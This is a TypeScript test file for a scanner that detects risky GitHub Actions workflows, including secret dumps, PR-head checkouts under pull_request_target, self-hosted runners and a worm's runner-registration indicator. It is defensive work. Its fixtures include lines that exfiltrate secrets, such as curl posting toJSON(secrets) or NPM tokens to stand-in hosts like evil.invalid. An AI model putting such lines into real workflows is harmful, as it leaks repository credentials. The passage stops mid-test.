import { test } from "node:test";
import assert from "node:assert/strict";
import { checkWorkflow } from "../src/checks/workflows.js";
import { RULES } from "../src/rules.js";
import { testCtx } from "./helpers.js";

const wf = (text: string, file = ".github/workflows/x.yml") => checkWorkflow(file, text, testCtx());
const ids = (text: string) => wf(text).map((f) => f.ruleId);
const has = (id: string, text: string) => ids(text).includes(id);

const job = (steps: string, head = "on: pull_request_target\n") => `${head}jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n${steps}`;

/* ---- WS-GH-001 ---- */
test("workflow: IOC filename matches on basename in any directory", () => {
  assert.ok(wf("on: push\n", "pkg/.github/workflows/wormsign-marker-workflow.yml").some((f) => f.ruleId === "WS-GH-001"));
  assert.ok(!wf("on: push\n", ".github/workflows/ci.yml").some((f) => f.ruleId === "WS-GH-001"));
});

/* ---- WS-GH-002 and comment handling ---- */
test("workflow: toJSON(secrets) flagged, but not inside a YAML comment", () => {
  assert.ok(has("WS-GH-002", job("      - run: echo ${{ toJSON(secrets) }}\n")));
  assert.ok(has("WS-GH-002", "      - run: echo ${{ toJSON( secrets ) }}\n"));
  assert.ok(has("WS-GH-002", "      - run: echo ${{ toJSON (secrets) }}\n"));
  // An if: condition is an expression written without ${{ }}.
  assert.ok(has("WS-GH-002", job("      - if: contains(toJSON(secrets), 'x')\n        run: echo hi\n")));
  assert.ok(!has("WS-GH-002", "# toJSON(secrets)\non: push\n"));
  assert.ok(!has("WS-GH-002", "      - run: echo hi # ${{ toJSON(secrets) }}\n"), "a ' #' after a plain scalar is a YAML comment");
});

test("workflow: WS-GH-002 covers every expression that reads the secrets context as a whole", () => {
  // GitHub's expression docs, "Object filters": the * syntax also applies to an object, so secrets.* is every value.
  const whole = [
    "${{ toJSON(secrets.*) }}",
    "${{ join(secrets.*, ' ') }}",
    "${{ join(secrets.*) }}",
    "${{ format('{0}', secrets) }}",
    "${{ format('{0} {1}', github.sha, toJSON(secrets)) }}",
    "${{ secrets }}",
    "${{ secrets.* }}",
    "${{ secrets[matrix.name] }}",
    "${{ secrets[format('{0}_TOKEN', inputs.env)] }}",
    "${{ contains(secrets, 'x') }}",
    "${{ fromJSON(toJSON(secrets)).NPM_TOKEN }}",
    // Context and function names are matched without regard to case, as GitHub does.
    "${{ TOJSON(Secrets.*) }}",
    "${{ Join(SECRETS.*, ',') }}",
    // A `}}` inside a string literal does not end the expression.
    "${{ format('}}{0}', secrets.*) }}",
  ];
  for (const e of whole) {
    const f = wf(job(`      - run: node build.js\n        env:\n          ALL: ${e}\n`)).filter((x) => x.ruleId === "WS-GH-002");
    assert.equal(f.length, 1, e);
    assert.equal(f[0]?.severity, "high", e);
  }
  assert.match(wf(job("      - run: echo ${{ join(secrets.*, ' ') }}\n")).find((f) => f.ruleId === "WS-GH-002")?.message ?? "", /other than as secrets\.NAME/);
  // One secret by name, in either syntax, and words that only look like the context, are not reported.
  const one = [
    "${{ secrets.NPM_TOKEN }}",
    "${{ secrets['NPM_TOKEN'] }}",
    "${{ secrets [ 'NPM-TOKEN' ] }}",
    "${{ Secrets.Npm_Token }}",
    "${{ toJSON(secrets.NPM_TOKEN) }}",
    "${{ format('{0}', secrets.A) }} ${{ secrets.B }}",
    "${{ inputs.secrets }}",
    "${{ needs.secrets-job.outputs.x }}",
    "${{ env.secrets_file }}",
    "${{ contains(github.event.head_commit.message, 'secrets') }}",
    "${{ hashFiles('secrets/**', 'it''s secrets') }}",
    "secrets",
  ];
  for (const e of one) assert.ok(!has("WS-GH-002", job(`      - run: echo ${e}\n`)), e);
  // An expression split across lines: toJSON(secrets) on a later line, outside the `${{` that opened it.
  assert.ok(has("WS-GH-002", job("      - run: |\n          echo '${{ fromJSON(\n            toJSON(secrets)) }}' > s.json\n")));
});

test("workflow: ' #' inside a block scalar or a quoted scalar does not hide the rest of the line", () => {
  assert.ok(has("WS-GH-002", job(`      - run: |\n          curl -H "X-Tag: #1" -d '\${{ toJSON(secrets) }}' https://a.invalid\n`)));
  assert.ok(has("WS-GH-002", job(`      - run: "echo ' #'; echo \${{ toJSON(secrets) }}"\n`)));
  assert.ok(has("WS-GH-002", job(`      - run: 'echo " #"; echo \${{ toJSON(secrets) }}'\n`)));
  assert.ok(has("WS-GH-002", job(`      - run: "echo a\n          #b \${{ toJSON(secrets) }}"\n`)), "multi-line double-quoted scalar");
  // Actions expands ${{ }} before the shell sees the script, so a shell comment still writes the secrets to disk.
  assert.ok(has("WS-GH-002", job("      - run: |\n          # ${{ toJSON(secrets) }}\n          echo hi\n")));
  assert.ok(has("WS-GH-005", job('      - run: |\n          curl -H "X-Build: #1" -d "${{ secrets.T }}" https://a.invalid\n')));
});

test("workflow: a block scalar ends at the first line not indented past its key", () => {
  const t = job("      - run: |\n          echo hi\n        env:\n          T: ${{ secrets.T }}\n      - run: curl -d \"$T\" https://a.invalid\n");
  assert.ok(has("WS-GH-005", t), "env: after the block must be parsed as YAML, not script");
  assert.ok(!has("WS-GH-002", job("      - run: |\n          echo hi\n      # ${{ toJSON(secrets) }}\n")), "a dedented comment after the block is a YAML comment");
});

test("workflow: block scalars with an anchor, a tag or an indentation indicator are still scripts", () => {
  for (const head of ["&x |", "!!str |", "!!str |-", "&x !!str >"]) {
    assert.ok(has("WS-GH-002", job(`      - run: ${head}\n          echo hi # \${{ toJSON(secrets) }}\n`)), head);
    assert.ok(has("WS-GH-003", job(`      - run: ${head}\n          gh pr checkout 5\n`)), head);
  }
  // With `|2` the content starts two columns past `run`, whatever the first line's indentation.
  assert.ok(has("WS-GH-003", job("      - run: |2\n              echo first\n          gh pr checkout 5\n")));
});

test("workflow: a block header on its own line is measured from the key above it", () => {
  // js-yaml and Psych: run is "echo hi # ${{ toJSON(secrets) }}\ngh pr checkout 5\n"; the content need only pass `run`.
  for (const key of ["run:", "run: !!str", "run: &a"]) {
    const t = job(`      - ${key}\n            |\n          echo hi # \${{ toJSON(secrets) }}\n          gh pr checkout 5\n`);
    assert.ok(has("WS-GH-002", t), key);
    assert.ok(has("WS-GH-003", t), key);
  }
  assert.ok(has("WS-GH-002", job("      -\n          |\n        echo # ${{ toJSON(secrets) }}\n")), "a `-` alone, then the header");
  assert.ok(has("WS-GH-002", job("      - run: !!str\n          &a\n            |\n          echo # ${{ toJSON(secrets) }}\n")), "an anchor on a line between key and header");
  assert.ok(has("WS-GH-007", job("      - run:\n          |\n          echo hi\n", "on: discussion\n")), "it is a run step");
});

test("workflow: a run: plain scalar continued on the next lines is one script", () => {
  // js-yaml and Psych: run is "echo; gh pr checkout 5", which the shell runs as two commands.
  assert.ok(has("WS-GH-003", job("      - run: echo;\n          gh pr checkout 5\n")));
  assert.ok(has("WS-GH-005", job('      - run: echo;\n          curl -d "$T" https://a.invalid\n        env:\n          T: ${{ secrets.T }}\n')));
  assert.ok(!has("WS-GH-003", job("      - name: echo;\n          gh pr checkout 5\n        run: make\n")), "a continued name: is not a script");
});

test("workflow: a run: value on the line below the key, or in a multi-line quoted scalar, is a script", () => {
  // js-yaml: run is "gh pr checkout 5", "echo; gh pr checkout 5" or "echo; gh pr checkout 5" in each form.
  for (const r of ["\n          gh pr checkout 5", "\n          echo;\n          gh pr checkout 5", '\n          "gh pr checkout 5"', "\n          'gh pr checkout 5'", ' "echo;\n          gh pr checkout 5"', "\n          'echo;\n          gh pr checkout 5'"]) {
    assert.ok(has("WS-GH-003", job(`      - run:${r}\n`)), JSON.stringify(r));
  }
  assert.ok(has("WS-GH-005", job('      - run:\n          curl -d "$T" https://a.invalid\n        env:\n          T: ${{ secrets.T }}\n')));
  assert.ok(has("WS-GH-007", job("      - run:\n          echo hi\n", "on: discussion\n")));
  assert.ok(!has("WS-GH-003", job("      - name:\n          gh pr checkout 5\n        run: make\n")), "a name: on the next line is not a script");
});

test("workflow: a plain scalar on the line below its key continues on any line indented past the key", () => {
  // js-yaml and Psych: name is `CI "x` (or `build "it`), so the quote is content and the run: step's ' #' is not a comment.
  const leak = `      - run: "echo ' #'; curl -d '\${{ toJSON(secrets) }}' https://evil.invalid"\n`;
  assert.ok(has("WS-GH-002", job(leak, 'on: pull_request_target\nname:\n    CI\n  "x\n')));
  assert.ok(has("WS-GH-002", job(leak.replace(/'/g, "@").replace(/"/g, "'").replace(/@/g, '"'), "on: pull_request_target\nname:\n    CI\n  'x\n")));
  assert.ok(has("WS-GH-002", job(`      - name:\n            build\n          "it\n${leak.replace("- run", "  run")}`)));
});

/* ---- quote tracking ---- */
const RISKY_JOBS = [
  "jobs:",
  "  a:",
  "    runs-on: self-hosted",
  "    steps:",
  "STEP      - run: 'echo \" #\"; echo ${{ toJSON(secrets) }}'",
  "      - uses: actions/checkout@v4",
  "        with:",
  "          ref: ${{ github.event.pull_request.head.sha }}",
  '      - run: curl -d "$T" https://a.invalid',
  "        env:",
  "          T: ${{ secrets.T }}",
  "  b:",
  "    runs-on: [WORMSIGNTEST]",
  "",
].join("\n");
const missed = (top: string, step = "") => {
  const got = ids(`${top}on: pull_request_target\n${RISKY_JOBS.replace("STEP", step)}`);
  return ["WS-GH-002", "WS-GH-003", "WS-GH-004", "WS-GH-005", "WS-GH-006"].filter((id) => !got.includes(id));
};

test("workflow: a quote inside a plain scalar is content and does not blind the rest of the file", () => {
  assert.deepEqual(missed(""), []);
  // Each of these is a plain scalar that YAML parsers read as ordinary text (`name: CI - '` is "CI - '").
  // Were the quote taken as opening one, the next real quote would close it and its ' #' would read as a comment.
  for (const top of ["name: CI - '\n", "name: a,'x\n", "name: a -'x\n", "name: a:'x\n", 'name: a,"x\n', "name: CI\n  'x\n", "name:\n  CI\n  'x\n", "env:\n  L: [a,\n    b 'c]\n"]) {
    assert.deepEqual(missed(top), [], JSON.stringify(top));
  }
  for (const step of ["      - run: echo ok - '\n", '      - run: echo ok, "\n', "      - run: echo\n          'x\n", "      - name: a b\n          'c\n"]) {
    assert.deepEqual(missed("", step), [], JSON.stringify(step));
  }
});

test("workflow: a quote that starts a scalar still protects ' #', after an anchor or tag and across flow lines", () => {
  assert.ok(has("WS-GH-002", job(`      - run: !!str "echo ' #'; echo \${{ toJSON(secrets) }}"\n`)));
  assert.ok(has("WS-GH-002", job(`      - run: &r 'echo " #"; echo \${{ toJSON(secrets) }}'\n`)));
  assert.ok(has("WS-GH-002", job(`      - uses: a/b@v1\n        with:\n          x: [1,\n            2, 'a #\${{ toJSON(secrets) }}']\n`)));
  assert.ok(has("WS-GH-002", job(`      - uses: a/b@v1\n        with: {"y":"a #\${{ toJSON(secrets) }}"}\n`)));
});

test("workflow: a quote the scanner cannot close does not hide later keys or scripts", () => {
  // Not valid YAML; it stands in for any input where the quote tracking guesses wrong.
  const t = "name: 'CI\non: pull_request_target\njobs:\n  a:\n    runs-on: self-hosted\n    steps:\n      - run: |\n          gh pr checkout 5\n";
  const got = ids(t);
  assert.ok(got.includes("WS-GH-003"), "on: and the run: block are still read");
  assert.ok(got.includes("WS-GH-004"), "runs-on is still read");
  assert.match(wf(t).find((f) => f.ruleId === "WS-GH-004")?.key ?? "", /^self-hosted:a:/, "the job id is still tracked");
});

test("workflow: a line that looks like a block header inside a multi-line quoted scalar does not end the quote", () => {
  // js-yaml and Psych read each `|`, `x: |` or `>` line here as text in the quoted run: string, so the `#` after it is content.
  const runs = [
    `"echo a\n          |\n          #x\\ncurl -d '\${{ toJSON(secrets) }}' https://evil.invalid"`,
    `"echo a\n          x: |\n          #x\\ncurl -d '\${{ toJSON(secrets) }}' https://evil.invalid"`,
    `'echo a\n          >\n          #x curl -d "\${{ toJSON(secrets) }}" https://evil.invalid'`,
    `"echo\n          x: |\n        # \${{ toJSON(secrets) }}"`,
  ];
  for (const r of runs) assert.ok(has("WS-GH-002", job(`      - run: ${r}\n`)), r);
});

test("workflow: a block header inside a quoted scalar does not swallow the keys after the quote", () => {
  // js-yaml and Psych: name is "x | ", then runs-on and the run: block are ordinary YAML.
  const got = ids('on: pull_request_target\njobs:\n  a:\n    name: "x\n  |\n   "\n    runs-on: self-hosted\n    steps:\n      - run: |\n          gh pr checkout 5\n');
  assert.ok(got.includes("WS-GH-004"), "runs-on is read");
  assert.ok(got.includes("WS-GH-003"), "the run: block is a script");
});

test("workflow: an on: inside a quoted scalar does not hide the real trigger", () => {
  // js-yaml and Psych: name is "CI on: push", on is pull_request_target.
  assert.ok(has("WS-GH-003", job("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n", 'name: "CI\non: push"\non: pull_request_target\n')));
});

test("workflow: a file with CR-only line breaks is read line by line", () => {
  // YAML breaks lines at a lone CR too; js-yaml and Psych read the whole workflow from this.
  const got = ids("name: CI # build\ron: pull_request_target\rjobs:\r  a:\r    runs-on: self-hosted\r    steps:\r      - run: echo ${{ toJSON(secrets) }}\r");
  assert.ok(got.includes("WS-GH-002") && got.includes("WS-GH-004"), JSON.stringify(got));
});

test("workflow: a byte order mark does not hide the on: key", () => {
  assert.ok(has("WS-GH-003", `\uFEFF${job("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n")}`));
});

/* ---- WS-GH-003 ---- */
test("workflow: pull_request_target + head checkout flagged; plain pull_request is not", () => {
  const body = "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n";
  assert.ok(has("WS-GH-003", `on: pull_request_target\n${body}`));
  assert.ok(has("WS-GH-003", `on:\n  pull_request_target:\n    types: [opened]\n${body}`));
  assert.ok(!has("WS-GH-003", `on: pull_request\n${body}`));
  assert.ok(!has("WS-GH-003", "on: pull_request_target\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n"), "default-branch checkout is safe");
});

test("workflow: WS-GH-003 recognises the real forms of a PR-head checkout", () => {
  const forms = [
    "      - uses: actions/checkout@v4\n        with:\n          ref: refs/pull/${{ github.event.pull_request.number }}/merge\n",
    "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.merge_commit_sha }}\n",
    "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head['sha'] }}\n",
    "      - uses: actions/checkout@v4\n        with:\n          repository: ${{ github.event.pull_request.head.repo.full_name }}\n",
    "      - uses: actions/checkout@v4\n        with: { ref: \"${{ github.event.pull_request.head.sha }}\" }\n",
    "      - run: gh pr checkout ${{ github.event.pull_request.number }}\n",
    "      - run: git fetch origin pull/${{ github.event.pull_request.number }}/head:pr && git checkout pr\n",
    "      - run: |\n          git fetch origin ${{ github.event.pull_request.head.sha }}\n          git checkout FETCH_HEAD\n",
  ];
  for (const f of forms) {
    assert.ok(has("WS-GH-003", job(f)), f);
    assert.ok(!has("WS-GH-003", job(f, "on: pull_request\n")), `plain pull_request: ${f}`);
  }
});

test("workflow: WS-GH-003 reads the trigger from on:, in quoted and list forms, and covers workflow_run", () => {
  const step = "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n";
  assert.ok(has("WS-GH-003", job(step, 'on: ["pull_request_target"]\n')));
  assert.ok(has("WS-GH-003", job(step, "'on':\n  - 'pull_request_target'\n")));
  assert.ok(has("WS-GH-003", job("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.workflow_run.head_sha }}\n", "on:\n  workflow_run:\n    workflows: [ci]\n")));
  assert.match(wf(job(step, "on: workflow_run\n")).find((f) => f.ruleId === "WS-GH-003")?.message ?? "", /^workflow_run workflow/);
});

test("workflow: an on: flow collection wrapped onto later lines is read whole", () => {
  for (const head of ["on: [push,\n  pull_request_target]\n", "on: [\n  push,\n  pull_request_target,\n  ]\n", "on:\n  [\n    push,\n    pull_request_target,\n  ]\n", "on: {push: {},\n  pull_request_target: {}}\n", "on: &x [push,\n  pull_request_target]\n"]) {
    assert.ok(has("WS-GH-003", job("      - run: gh pr checkout 5\n", head)), JSON.stringify(head));
  }
});

test("workflow: an indentless list under on: or runs-on: is read", () => {
  // PyYAML and Ruby emit lists at their key's own indent; js-yaml reads `on:\n- x` as on: [x].
  const checkout = "    steps:\n    - uses: actions/checkout@v4\n      with:\n        ref: ${{ github.event.pull_request.head.sha }}\n";
  assert.ok(has("WS-GH-003", `on:\n- pull_request_target\njobs:\n  a:\n${checkout}`));
  assert.ok(has("WS-GH-007", "on:\n- discussion\njobs:\n  a:\n    steps:\n    - run: echo\n"));
  // An anchor or tag on `on:` is not its value: the list below still is, and the anchor name is no event.
  for (const head of ["on: &x\n- pull_request_target\n", "on: &x\n  - pull_request_target\n", "on: !!seq\n- pull_request_target\n"]) {
    assert.ok(has("WS-GH-003", `${head}jobs:\n  a:\n${checkout}`), JSON.stringify(head));
  }
  assert.ok(!has("WS-GH-007", "on: &discussion [push]\njobs:\n  a:\n    steps:\n    - run: echo\n"), "an anchor name is not an event");
  assert.ok(has("WS-GH-004", "jobs:\n  a:\n    runs-on:\n    - self-hosted\n"));
  assert.ok(has("WS-GH-006", "jobs:\n  a:\n    runs-on:\n    - linux\n    - WORMSIGNTEST\n"));
  assert.ok(!has("WS-GH-004", "jobs:\n  a:\n    runs-on:\n    - ubuntu-latest\n    env:\n      L: self-hosted\n"), "the list ends at the next key");
});

test("workflow: WS-GH-003 false positives: the word in prose, a fork guard, and echoing the head ref", () => {
  const step = "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n";
  assert.ok(!has("WS-GH-003", job(step, "name: CI (safe; we never use pull_request_target)\non: pull_request\n")));
  assert.ok(!has("WS-GH-003", job("      - run: echo pull_request_target\n" + step, "on: pull_request\n")));
  assert.ok(!has("WS-GH-003", job("      - if: github.event.pull_request.head.repo.full_name == github.repository\n        run: echo same-repo\n")));
  assert.ok(!has("WS-GH-003", job("      - run: echo ${{ github.head_ref }}\n")));
});

test("workflow: WS-GH-003 needs a git command that fetches or checks out code, not any git command", () => {
  const H = "${{ github.event.workflow_run.head_sha }}";
  const P = "${{ github.event.pull_request.head.sha }}";
  // react's runtime_commit_artifacts.yml: reading a commit's message is not running its code.
  const metadata = [
    `git show ${H} --no-patch`,
    `git commit -m "$(git show ${H} --no-patch --format=%B)"`,
    `git log -1 --format=%B ${P}`,
    `git -C repo rev-parse ${P}`,
    `git -c core.quotepath=off diff --name-only ${P}`,
    `which git && echo ${P}`,
  ];
  for (const c of metadata) assert.ok(!has("WS-GH-003", job(`      - run: ${c}\n`, "on: workflow_run\n")), c);
  const fetches = [
    `git fetch origin ${P}`,
    `git checkout ${P}`,
    `git switch --detach ${P}`,
    `git worktree add pr ${P}`,
    `git pull origin ${P}`,
    `git clone --branch \${{ github.head_ref }} https://github.com/a/b`,
    `git reset --hard ${P}`,
    `git merge ${P}`,
    `git rebase ${P}`,
    `git cherry-pick ${P}`,
    `git restore --source=${P} .`,
    `git archive ${P} | tar -x`,
    `git -C repo -c protocol.version=2 fetch --depth=1 origin ${P}`,
    `git --git-dir .git --work-tree . checkout ${P}`,
    `/usr/bin/git checkout ${P}`,
    `echo; $(git checkout ${P})`,
    `git show ${H}; git checkout ${H}`,
    // Not a plain subcommand, or an alias: fail closed.
    `git $CMD ${P}`,
    `git -c alias.co=checkout co ${P}`,
    `git ${"-p ".repeat(20)}show ${P}`,
  ];
  for (const c of fetches) assert.ok(has("WS-GH-003", job(`      - run: ${c}\n`)), c);
});

/* ---- WS-GH-004 ---- */
test("workflow: self-hosted in inline, array and block-list forms", () => {
  const sh = (t: string) => has("WS-GH-004", t);
  assert.ok(sh("    runs-on: self-hosted\n"));
  assert.ok(sh("    runs-on: [self-hosted, linux]\n"));
  assert.ok(sh("    runs-on:\n      - self-hosted\n      - linux\n"));
  assert.ok(sh("jobs:\n  a:\n    runs-on: [\n      self-hosted\n    ]\n"), "a flow list wrapped onto later lines");
  assert.ok(!sh("    runs-on: ubuntu-latest\n"));
  assert.ok(!sh("    runs-on:\n      - ubuntu-latest\n"));
});

test("workflow: self-hosted in the group/labels mapping, quoted-key and matrix forms", () => {
  const sh = (t: string) => has("WS-GH-004", t);
  assert.ok(sh("jobs:\n  a:\n    runs-on:\n      group: ops\n      labels: [self-hosted, linux]\n    steps:\n      - run: make\n"));
  assert.ok(sh("jobs:\n  a:\n    runs-on:\n      group: ops\n      labels:\n        - self-hosted\n"));
  assert.ok(sh("jobs:\n  a:\n    runs-on: { group: ops, labels: [self-hosted] }\n"));
  assert.ok(sh('jobs:\n  a:\n    "runs-on": self-hosted\n'));
  assert.ok(sh("jobs:\n  a:\n    strategy:\n      matrix:\n        os: [ubuntu-latest, self-hosted]\n    runs-on: ${{ matrix.os }}\n"));
  assert.ok(!sh("jobs:\n  a:\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n    runs-on: ${{ matrix.os }}\n  b:\n    strategy:\n      matrix:\n        os: [self-hosted]\n    runs-on: ubuntu-latest\n"));
  assert.ok(!sh("jobs:\n  a:\n    runs-on:\n      group: larger-runners\n    env:\n      NOTE: self-hosted\n"), "only children of runs-on count");
  assert.ok(!sh("jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          runs-on: self-hosted\n"), "script text is not YAML");
});

/* ---- WS-GH-005 ---- */
test("workflow: secret to network or file flagged; env-file targets are not", () => {
  const s = (t: string) => has("WS-GH-005", t);
  assert.ok(s('      - run: curl -d "${{ secrets.T }}" https://a.invalid\n'));
  assert.ok(s('      - run: echo "${{ secrets.T }}" > token.txt\n'));
  assert.ok(s('      - run: echo "${{ secrets.T }}" | base64\n'));
  assert.ok(!s('      - run: echo "${{ secrets.T }}" >> "$GITHUB_ENV"\n'));
  assert.ok(!s('      - run: echo "t=${{ secrets.T }}" | tee -a $GITHUB_OUTPUT\n'));
  assert.ok(!s('      - run: echo "t=${{ secrets.T }}" >> $env:GITHUB_ENV\n'));
  assert.ok(!s("        env:\n          TOKEN: ${{ secrets.T }}\n"));
});

test("workflow: an env-file mention elsewhere on the line does not exempt a network sink", () => {
  const s = (t: string) => has("WS-GH-005", t);
  assert.ok(s('      - run: curl -sd "${{ secrets.NPM_TOKEN }}" "https://evil.invalid/c?GITHUB_ENV"\n'));
  assert.ok(s('      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://x.invalid/c; echo done >> "$GITHUB_ENV"\n'));
});

test("workflow: a secret passed through env: and used by a network command is flagged", () => {
  const s = (t: string) => has("WS-GH-005", t);
  assert.ok(s(job('      - run: curl -X POST -d "$NPM_TOKEN" https://a.invalid\n        env:\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n')));
  assert.ok(s(`env:\n  TOKEN: \${{ secrets.T }}\n${job("      - run: |\n          echo start\n          wget --header=\"x: ${TOKEN}\" https://a.invalid\n", "")}`));
  assert.ok(s(job('      - shell: pwsh\n        run: Invoke-WebRequest -Body $env:TOKEN https://a.invalid\n        env:\n          TOKEN: ${{ secrets.T }}\n')));
  assert.ok(!s(job("      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n")), "secret used without a sink");
  assert.ok(!s(job('      - run: curl -d "$OTHER" https://a.invalid\n        env:\n          TOKEN: ${{ secrets.T }}\n          OTHER: plain\n')), "sink reads a non-secret variable");
});

test("workflow: a secret a script assigns to a shell variable and uses on a later line is a known miss, as WS-GH-005's text says", () => {
  // Shell variables are not tracked (a review's report): the miss is named in src/rules.ts, so this pins the text to
  // the behaviour. On one line, the secret and the sink are read together and reported.
  const s = (t: string) => has("WS-GH-005", t);
  assert.ok(!s(job('      - run: |\n          T="${{ secrets.TOKEN }}"\n          curl -d "$T" https://a.invalid\n')));
  assert.ok(s(job('      - run: T="${{ secrets.TOKEN }}"; curl -d "$T" https://a.invalid\n')));
  const rule = RULES.find((r) => r.id === "WS-GH-005");
  assert.match(rule?.description ?? "", /Not followed, so not reported: a secret the script assigns to a shell variable and uses on a later line \(T="\$\{\{ secrets\.TOKEN \}\}", then curl -d "\$T"\)/);
});

/* ---- WS-GH-006 ---- */
test("workflow: runner name IOC via runs-on and via --name registration", () => {
  assert.ok(has("WS-GH-006", "    runs-on: WORMSIGNTEST\n"));
  assert.ok(has("WS-GH-006", "      - run: ./config.sh --name WORMSIGNTEST --unattended\n"));
});

test("workflow: runner registration in the quoted and --name= forms, and the IOC name in a runs-on list", () => {
  // Datadog's deobfuscated payload: ./config.sh --url ... --token ${runnerToken} --name "SHA1HULUD"
  assert.ok(has("WS-GH-006", '      - run: ./config.sh --token x --name "WORMSIGNTEST"\n'));
  assert.ok(has("WS-GH-006", "      - run: ./config.sh --name 'WORMSIGNTEST'\n"));
  assert.ok(has("WS-GH-006", "      - run: ./config.sh --name=WORMSIGNTEST\n"));
  assert.ok(!has("WS-GH-006", "      - run: ./config.sh --name WORMSIGNTEST-dev\n"));
  assert.ok(has("WS-GH-006", "    runs-on:\n      - self-hosted\n      - WORMSIGNTEST\n"));
});

/* ---- WS-GH-007 ---- */
test("workflow: discussion trigger with a run step", () => {
  assert.ok(has("WS-GH-007", "on:\n  discussion:\njobs:\n  a:\n    steps:\n      - run: echo hi\n"));
  assert.ok(!has("WS-GH-007", "on: push\njobs:\n  a:\n    steps:\n      - run: echo hi\n"));
  assert.ok(!has("WS-GH-007", "on:\n  discussion:\njobs:\n  a:\n    steps:\n      - uses: actions/labeler@v5\n"), "no run step, no finding");
  assert.ok(!has("WS-GH-007", "on:\n  discussion:\ndefaults:\n  run:\n    shell: bash\njobs:\n  a:\n    steps:\n      - uses: actions/labeler@v5\n"), "defaults.run is not a run step");
});

test("workflow: WS-GH-007 is high when the discussion workflow also runs on a self-hosted runner", () => {
  // Wiz: the worm's discussion.yaml "contains an injection vulnerability and runs specifically on self-hosted runners".
  const sev = (t: string) => wf(t).find((f) => f.ruleId === "WS-GH-007")?.severity;
  assert.equal(sev("on:\n  discussion:\njobs:\n  p:\n    runs-on: self-hosted\n    steps:\n      - run: echo ${{ github.event.discussion.body }}\n"), "high");
  assert.equal(sev("on: discussion\njobs:\n  p:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"), "medium");
});

test("workflow: WS-GH-007 reads the trigger from on: only, including a quoted on:", () => {
  const run = "jobs:\n  a:\n    steps:\n      - run: echo hi\n";
  assert.ok(!has("WS-GH-007", `on: push\njobs:\n  discussion:\n    steps:\n      - run: echo hi\n`), "job id named discussion");
  assert.ok(!has("WS-GH-007", `on: push\n${run}      - uses: some/action@v1\n        with:\n          discussion: general\n`), "action input named discussion");
  assert.ok(has("WS-GH-007", `'on': discussion\n${run}`));
  assert.ok(has("WS-GH-007", `"on": [push, "discussion_comment"]\n${run}`));
});

/* ---- fingerprints ---- */
test("workflow: fingerprints survive lines moving and differ for different content", () => {
  const risky = [
    "on: pull_request_target",
    "jobs:",
    "  a:",
    "    runs-on: [self-hosted, linux]",
    "    steps:",
    "      - uses: actions/checkout@v4",
    "        with:",
    "          ref: ${{ github.event.pull_request.head.sha }}",
    "      - run: echo '${{ toJSON(secrets) }}' > /tmp/s.json",
    '      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://a.invalid',
    "",
  ].join("\n");
  const shifted = risky.replace("    steps:\n", "    steps:\n      # reviewed\n      - run: echo first\n").replace("jobs:", "# header\njobs:");
  const fp = (t: string) => new Map(wf(t).map((f) => [f.ruleId, { fp: f.fingerprint, line: f.line, key: f.key }]));
  const a = fp(risky);
  const b = fp(shifted);
  for (const id of ["WS-GH-002", "WS-GH-003", "WS-GH-004", "WS-GH-005"]) {
    assert.ok(a.get(id) && b.get(id), id);
    assert.notEqual(a.get(id)?.line, b.get(id)?.line, `${id} line moved`);
    assert.equal(a.get(id)?.fp, b.get(id)?.fp, `${id} fingerprint must not depend on the line number`);
    assert.doesNotMatch(a.get(id)?.key ?? "", new RegExp(`:${a.get(id)?.line}$`));
  }
  const other = fp(risky.replace("secrets.NPM_TOKEN", "secrets.GH_TOKEN"));
  assert.notEqual(other.get("WS-GH-005")?.fp, a.get("WS-GH-005")?.fp, "a different line must not inherit a baselined fingerprint");
  const otherJob = fp(risky.replace("  a:", "  b:"));
  assert.notEqual(otherJob.get("WS-GH-004")?.fp, a.get("WS-GH-004")?.fp, "the job id is part of the key");
  const runner = (j: string) => wf(`jobs:\n  ${j}:\n    runs-on: WORMSIGNTEST\n`).find((f) => f.ruleId === "WS-GH-006")?.fingerprint;
  assert.notEqual(runner("a"), runner("b"), "the job id is part of the runs-on runner key");
});

test("workflow: identical risky lines keep separate fingerprints, so dedupe and a baseline cannot merge them", () => {
  const sink = '      - run: curl -d "${{ secrets.T }}" https://a.invalid\n';
  const fps = (t: string, id: string) => wf(t).filter((f) => f.ruleId === id).map((f) => f.fingerprint);
  assert.equal(new Set(fps(job(sink + sink), "WS-GH-005")).size, 2);
  assert.deepEqual(fps(job(sink + sink), "WS-GH-005")[0], fps(job(sink), "WS-GH-005")[0], "the first copy keeps its fingerprint");
  assert.equal(new Set(fps("      - run: ./config.sh --name WORMSIGNTEST\n      - run: ./config.sh --name WORMSIGNTEST\n", "WS-GH-006")).size, 2);
});

/* ---- hostile input ---- */
/**
 * The time a hostile input may take. These tests catch quadratic or worse growth, which on these inputs takes minutes,
 * not a slow runner: linear work takes about 0.5 s on an M4 Pro, so 5 s leaves room for a busy 2-vCPU CI runner.
 * WORMSIGN_PERF_FACTOR scales it (for example under a mutation run or a profiler).
 */
const LIMIT_MS = 5000 * (Number(process.env["WORMSIGN_PERF_FACTOR"]) || 1);

test("workflow: every rule is linear-time on hostile 2 MiB inputs", () => {
  const N = 2 * 1024 * 1024;
  const fill = (unit: string) => unit.repeat(Math.ceil(N / unit.length)).slice(0, N);
